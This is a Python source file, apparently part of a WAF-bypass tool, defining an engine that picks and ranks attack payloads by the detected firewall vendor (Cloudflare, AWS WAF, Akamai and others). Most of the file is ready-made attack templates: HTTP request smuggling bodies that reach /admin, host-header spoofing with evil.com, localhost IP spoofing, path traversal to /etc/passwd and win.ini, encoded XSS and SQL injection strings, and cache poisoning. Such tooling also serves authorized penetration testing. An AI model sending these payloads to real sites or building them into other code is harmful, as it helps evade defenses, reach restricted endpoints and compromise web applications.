"""
Smart Mutation Engine
=====================
Generates WAF-specific, targeted mutations based on:
1. Detected WAF vendor (from fingerprinter)
2. Known bypass techniques
3. Research history (what worked before)

Now with 50+ specialized mutation templates across 8 attack categories.
"""

from typing import Any, Dict, List, Optional, Tuple

import structlog

from wafmancer.core.fingerprinter import WAFSignature, WAFVendor

logger = structlog.get_logger(__name__)


class SmartMutationEngine:
    """
    Generates intelligent, WAF-specific mutations for probing.
    
    Now with 50+ mutation templates covering:
    - HTTP Request Smuggling (CL.TE, TE.CL, TE.TE variants)
    - Header Injection & Manipulation
    - Path Traversal & URL Obfuscation
    - Encoding Bypasses (Unicode, URL, HTML entities)
    - Protocol-Level Attacks
    - Method Tampering
    - Content-Type Confusion
    - Cache Deception & Poisoning
    """

    MUTATION_TEMPLATES: Dict[str, List[Dict[str, Any]]] = {
        
        # ============================================================
        # HTTP REQUEST SMUGGLING (Highest priority — most effective)
        # ============================================================
        "http_smuggling": [
            {
                "name": "CL.TE_classic",
                "headers": {
                    "Content-Length": "4",
                    "Transfer-Encoding": "chunked",
                },
                "body": b"0\r\n\r\nG",
                "description": "Classic CL.TE — Content-Length wins on front-end, chunked on back-end",
            },
            {
                "name": "TE.CL_classic",
                "headers": {
                    "Content-Length": "6",
                    "Transfer-Encoding": "chunked",
                },
                "body": b"0\r\n\r\nX",
                "description": "Classic TE.CL — Transfer-Encoding wins on front-end, Content-Length on back-end",
            },
            {
                "name": "TE.TE_obfuscation",
                "headers": {
                    "Transfer-Encoding": "chunked",
                    "Transfer-encoding": "identity",
                },
                "description": "TE.TE confusion — duplicate headers with different casing",
            },
            {
                "name": "CL_zero_bypass",
                "headers": {
                    "Content-Length": "0",
                    "Transfer-Encoding": "chunked",
                },
                "body": b"GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
                "description": "CL.0 smuggling — Content-Length 0 with smuggled prefix",
            },
            {
                "name": "TE_header_obfuscation",
                "headers": {
                    "Transfer-Encoding": "xchunked",
                    "Transfer-Encoding ": "chunked",
                },
                "description": "Transfer-Encoding header obfuscation with trailing space",
            },
            {
                "name": "TE_tab_prefix",
                "headers": {
                    "Transfer-Encoding": "\tchunked",
                },
                "description": "Transfer-Encoding with tab character prefix",
            },
            {
                "name": "TE_newline_suffix",
                "headers": {
                    "Transfer-Encoding": "chunked\n",
                },
                "description": "Transfer-Encoding with newline suffix",
            },
        ],

        # ============================================================
        # HEADER INJECTION & MANIPULATION
        # ============================================================
        "header_injection": [
            {
                "name": "x-forwarded-host_inject",
                "headers": {"X-Forwarded-Host": "evil.com"},
                "description": "X-Forwarded-Host header injection for host header spoofing",
            },
            {
                "name": "x-forwarded-for_chain",
                "headers": {"X-Forwarded-For": "127.0.0.1, 10.0.0.1, 172.16.0.1, 192.168.1.1"},
                "description": "Multi-hop X-Forwarded-For chain for IP restriction bypass",
            },
            {
                "name": "x-original-url_override",
                "headers": {"X-Original-URL": "/admin"},
                "description": "URL override via X-Original-URL header",
            },
            {
                "name": "x-rewrite-url_override",
                "headers": {"X-Rewrite-URL": "/admin/config"},
                "description": "URL override via X-Rewrite-URL header",
            },
            {
                "name": "x-http-method-override",
                "headers": {"X-HTTP-Method-Override": "PUT"},
                "description": "HTTP method override for REST API bypass",
            },
            {
                "name": "x-forwarded-scheme_http",
                "headers": {"X-Forwarded-Scheme": "http"},
                "description": "Scheme downgrade to bypass HTTPS-only restrictions",
            },
            {
                "name": "x-real-ip_spoof",
                "headers": {"X-Real-IP": "127.0.0.1"},
                "description": "X-Real-IP spoofing for localhost bypass",
            },
            {
                "name": "x-client-ip_spoof",
                "headers": {"X-Client-IP": "10.0.0.1"},
                "description": "X-Client-IP spoofing for internal network bypass",
            },
        ],

        # ============================================================
        # PATH TRAVERSAL & URL OBFUSCATION
        # ============================================================
        "path_traversal": [
            {
                "name": "path_traversal_unicode",
                "headers": {"X-Custom-URL": "..%c0%af..%c0%af..%c0%afetc/passwd"},
                "description": "Unicode-encoded path traversal (overlong UTF-8)",
            },
            {
                "name": "path_traversal_double_enc",
                "headers": {"X-Custom-URL": "%252e%252e%252f%252e%252e%252f"},
                "description": "Double URL-encoded path traversal",
            },
            {
                "name": "path_traversal_utf8_overlong",
                "headers": {"X-Custom-URL": "..%ef%bc%8f..%ef%bc%8f"},
                "description": "UTF-8 fullwidth slash path traversal",
            },
            {
                "name": "path_traversal_backslash",
                "headers": {"X-Custom-URL": "..\\..\\..\\windows\\win.ini"},
                "description": "Backslash path traversal for Windows servers",
            },
            {
                "name": "path_traversal_nullbyte",
                "headers": {"X-Custom-URL": "../../../etc/passwd%00.html"},
                "description": "Null byte injection to bypass extension checks",
            },
            {
                "name": "path_traversal_encoded_slash",
                "headers": {"X-Custom-URL": "..%2f..%2f..%2fetc%2fpasswd"},
                "description": "Single-encoded forward slash traversal",
            },
        ],

        # ============================================================
        # ENCODING BYPASSES
        # ============================================================
        "encoding_bypass": [
            {
                "name": "unicode_nfd_bypass",
                "headers": {"X-Encoded": "caf\\u0301"},
                "description": "Unicode NFD normalization bypass",
            },
            {
                "name": "html_entity_encode",
                "headers": {"X-Encoded": "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"},
                "description": "HTML entity encoded XSS payload",
            },
            {
                "name": "base64_like_bypass",
                "headers": {"X-Encoded": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="},
                "description": "Base64-encoded payload (potential decode gap)",
            },
            {
                "name": "hex_encoding_bypass",
                "headers": {"X-Encoded": "0x2720x4f0x5220x310x3d0x31"},
                "description": "Hex-encoded SQL injection payload",
            },
            {
                "name": "octal_encoding_bypass",
                "headers": {"X-Encoded": "\\047\\040\\117\\122\\040\\061\\075\\061"},
                "description": "Octal-encoded SQL injection payload",
            },
            {
                "name": "utf7_encoding_xss",
                "headers": {"X-Encoded": "+ADw-script+AD4-alert(1)+ADw-/script+AD4-"},
                "description": "UTF-7 encoded XSS payload",
            },
        ],

        # ============================================================
        # PROTOCOL-LEVEL ATTACKS
        # ============================================================
        "protocol_attacks": [
            {
                "name": "http_0.9_request",
                "headers": {},
                "description": "HTTP/0.9 simple request format (no headers)",
                "method_override": "GET / HTTP/0.9",
            },
            {
                "name": "http_pipeline_test",
                "headers": {"Connection": "keep-alive"},
                "description": "HTTP pipelining with multiple requests in one connection",
            },
            {
                "name": "absolute_uri_request",
                "headers": {"Host": "evil.com"},
                "description": "Absolute URI in request line for proxy bypass",
            },
            {
                "name": "hop_by_hop_headers",
                "headers": {
                    "Connection": "close, X-Bypass, X-Forwarded-For",
                    "X-Bypass": "injected",
                },
                "description": "Hop-by-hop header injection test",
            },
        ],

        # ============================================================
        # HTTP METHOD TAMPERING
        # ============================================================
        "method_tampering": [
            {
                "name": "method_override_header",
                "headers": {
                    "X-HTTP-Method-Override": "DELETE",
                    "X-HTTP-Method": "PUT",
                },
                "description": "Multiple HTTP method override headers",
            },
            {
                "name": "method_override_query",
                "headers": {},
                "url_suffix": "?_method=DELETE",
                "description": "Method override via query parameter",
            },
            {
                "name": "trace_method_test",
                "headers": {},
                "description": "TRACE method test (potential XST vulnerability)",
                "method_override": "TRACE",
            },
            {
                "name": "options_method_test",
                "headers": {},
                "description": "OPTIONS method test for CORS misconfiguration",
                "method_override": "OPTIONS",
            },
        ],

        # ============================================================
        # CONTENT-TYPE CONFUSION
        # ============================================================
        "content_type_confusion": [
            {
                "name": "json_content_hiding",
                "headers": {"Content-Type": "application/json"},
                "body": b'{"user": "<script>alert(1)</script>"}',
                "description": "XSS payload hidden in JSON content type",
            },
            {
                "name": "xml_content_hiding",
                "headers": {"Content-Type": "application/xml"},
                "body": b"<?xml version=\"1.0\"?><user><script>alert(1)</script></user>",
                "description": "XSS payload hidden in XML content type",
            },
            {
                "name": "multipart_boundary_injection",
                "headers": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary",
                },
                "body": b"------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.txt\"\r\n\r\nmalicious\r\n------WebKitFormBoundary--",
                "description": "Multipart boundary manipulation",
            },
            {
                "name": "charset_utf7_bypass",
                "headers": {"Content-Type": "text/html; charset=utf-7"},
                "description": "UTF-7 charset specification to bypass content filters",
            },
            {
                "name": "charset_utf16_bypass",
                "headers": {"Content-Type": "application/json; charset=utf-16"},
                "description": "UTF-16 charset to bypass JSON parsers",
            },
        ],

        # ============================================================
        # CACHE DECEPTION & POISONING
        # ============================================================
        "cache_attacks": [
            {
                "name": "cache_deception_css",
                "headers": {},
                "url_suffix": "/nonexistent.css",
                "description": "Cache deception via .css extension",
            },
            {
                "name": "cache_deception_js",
                "headers": {},
                "url_suffix": "/nonexistent.js",
                "description": "Cache deception via .js extension",
            },
            {
                "name": "cache_poison_xhost",
                "headers": {"X-Forwarded-Host": "evil.com"},
                "description": "Cache poisoning via X-Forwarded-Host header",
            },
            {
                "name": "cache_poison_xscheme",
                "headers": {"X-Forwarded-Scheme": "http"},
                "description": "Cache poisoning via X-Forwarded-Scheme header",
            },
            {
                "name": "web_cache_deception_path",
                "headers": {},
                "url_suffix": "/account/settings/nonexistent.css",
                "description": "Web cache deception with path confusion",
            },
        ],
    }

    # WAF-specific mutation mappings (expanded)
    VENDOR_MUTATIONS: Dict[WAFVendor, List[str]] = {
        WAFVendor.CLOUDFLARE: [
            "http_smuggling",
            "header_injection",
            "path_traversal",
            "encoding_bypass",
            "cache_attacks",
        ],
        WAFVendor.AWS_WAF: [
            "header_injection",
            "encoding_bypass",
            "content_type_confusion",
            "method_tampering",
        ],
        WAFVendor.AKAMAI: [
            "http_smuggling",
            "encoding_bypass",
            "header_injection",
            "protocol_attacks",
            "cache_attacks",
        ],
        WAFVendor.IMPERVA: [
            "encoding_bypass",
            "header_injection",
            "path_traversal",
            "content_type_confusion",
        ],
        WAFVendor.MODSECURITY: [
            "path_traversal",
            "encoding_bypass",
            "http_smuggling",
            "content_type_confusion",
            "method_tampering",
        ],
        WAFVendor.F5_BIGIP: [
            "http_smuggling",
            "header_injection",
            "protocol_attacks",
        ],
        WAFVendor.FORTINET: [
            "encoding_bypass",
            "path_traversal",
            "header_injection",
        ],
        WAFVendor.SUCURI: [
            "encoding_bypass",
            "header_injection",
            "cache_attacks",
        ],
        WAFVendor.CITRIX: [
            "http_smuggling",
            "protocol_attacks",
            "header_injection",
        ],
    }

    # Priority scoring for mutation categories
    CATEGORY_PRIORITY: Dict[str, int] = {
        "http_smuggling": 100,
        "header_injection": 85,
        "protocol_attacks": 80,
        "method_tampering": 70,
        "cache_attacks": 65,
        "encoding_bypass": 60,
        "path_traversal": 55,
        "content_type_confusion": 50,
    }

    def __init__(self, waf_signature: Optional[WAFSignature] = None) -> None:
        """
        Initialize the mutation engine.

        Args:
            waf_signature: Optional WAF fingerprint for targeted mutations
        """
        self.waf_signature = waf_signature
        logger.info("mutation_engine_initialized", 
                    vendor=waf_signature.vendor.value if waf_signature else "Unknown")

    def generate_all_mutations(self) -> List[Tuple[str, Dict[str, str], Optional[bytes], Optional[str]]]:
        """
        Generate all applicable mutations based on WAF fingerprint.

        Returns:
            List of (name, headers, optional_body, optional_url_suffix) tuples
        """
        mutations: List[Tuple[str, Dict[str, str], Optional[bytes], Optional[str]]] = []

        if self.waf_signature and self.waf_signature.vendor != WAFVendor.NONE:
            relevant_categories = self.VENDOR_MUTATIONS.get(
                self.waf_signature.vendor,
                list(self.MUTATION_TEMPLATES.keys())
            )
            logger.info("generating_targeted_mutations", 
                       vendor=self.waf_signature.vendor.value,
                       categories=relevant_categories)
        else:
            relevant_categories = list(self.MUTATION_TEMPLATES.keys())
            logger.info("generating_generic_mutations",
                       categories=relevant_categories)

        for category in relevant_categories:
            if category in self.MUTATION_TEMPLATES:
                for template in self.MUTATION_TEMPLATES[category]:
                    mutation = (
                        template["name"],
                        template["headers"].copy(),
                        template.get("body"),
                        template.get("url_suffix"),
                    )
                    mutations.append(mutation)

        logger.info("mutations_generated", total=len(mutations))
        return mutations

    def generate_priority_mutations(
        self, limit: int = 10
    ) -> List[Tuple[str, Dict[str, str], Optional[bytes], int, Optional[str]]]:
        """
        Generate mutations sorted by priority (most likely to bypass).

        Args:
            limit: Maximum number of priority mutations

        Returns:
            List of (name, headers, body, priority_score, url_suffix) tuples
        """
        all_mutations = self.generate_all_mutations()
        prioritized: List[Tuple[str, Dict[str, str], Optional[bytes], int, Optional[str]]] = []

        for name, headers, body, url_suffix in all_mutations:
            priority = 0
            
            # Calculate priority based on category
            for category, score in self.CATEGORY_PRIORITY.items():
                if category in self.MUTATION_TEMPLATES:
                    for template in self.MUTATION_TEMPLATES[category]:
                        if template["name"] == name:
                            priority = score
                            break

            # Boost priority for WAF-specific mutations
            if self.waf_signature and self.waf_signature.vendor in self.VENDOR_MUTATIONS:
                for cat in self.VENDOR_MUTATIONS[self.waf_signature.vendor]:
                    if cat in self.MUTATION_TEMPLATES:
                        for template in self.MUTATION_TEMPLATES[cat]:
                            if template["name"] == name:
                                priority += 50  # WAF-specific boost
                                break

            prioritized.append((name, headers, body, priority, url_suffix))

        # Sort by priority (highest first), take top N
        prioritized.sort(key=lambda x: x[3], reverse=True)
        return prioritized[:limit]

    def get_mutation_count(self) -> int:
        """Get total number of available mutations."""
        total = 0
        for templates in self.MUTATION_TEMPLATES.values():
            total += len(templates)
        return total

    def get_categories(self) -> List[str]:
        """Get list of mutation categories."""
        return list(self.MUTATION_TEMPLATES.keys())

    def get_mutations_by_category(self, category: str) -> List[str]:
        """Get mutation names for a specific category."""
        if category in self.MUTATION_TEMPLATES:
            return [t["name"] for t in self.MUTATION_TEMPLATES[category]]
        return []
